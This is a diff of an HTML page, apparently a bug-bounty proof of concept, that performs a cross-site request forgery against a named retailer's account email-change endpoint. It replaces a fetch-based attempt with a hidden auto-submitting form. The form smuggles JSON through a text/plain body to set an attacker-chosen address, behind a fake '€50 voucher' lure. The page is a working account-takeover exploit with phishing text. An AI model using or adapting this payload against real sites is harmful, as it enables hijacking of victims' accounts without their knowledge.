@@ -1,19 +1,23 @@
 <!DOCTYPE html>
 <html>
 
+<head>
+    <title>Claim Your Voucher</title>
+</head>
+
 <body>
-    <h1>Claiming Prize...</h1>
+    <h1>Congratulations!</h1>
+    <p>You have won a €50 Boozt voucher. Click the button below to claim it instantly.</p>
+
+    <form id="exploit-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST"
+        enctype="text/plain">
+        <input type="hidden" name='{"email":"absolutexon+pwned@wearehackerone.com","email":"' value='"}'>
+        <input type="submit" value="Claim Voucher">
+    </form>
+
     <script>
-        // The 'credentials: include' line is the key to the payout
-        fetch("https://www.boozt.com/eu/en/api/customer/profile/email/change", {
-            method: "POST",
-            mode: "no-cors",
-            credentials: "include", // <--- THIS IS WHAT WE MISSED
-            headers: {
-                "Content-Type": "text/plain"
-            },
-            body: '{"email":"absolutexon+payout@wearehackerone.com"}'
-        });
+        // Auto-submit the form as soon as the victim visits
+        document.getElementById('exploit-form').submit();
     </script>
 </body>
 
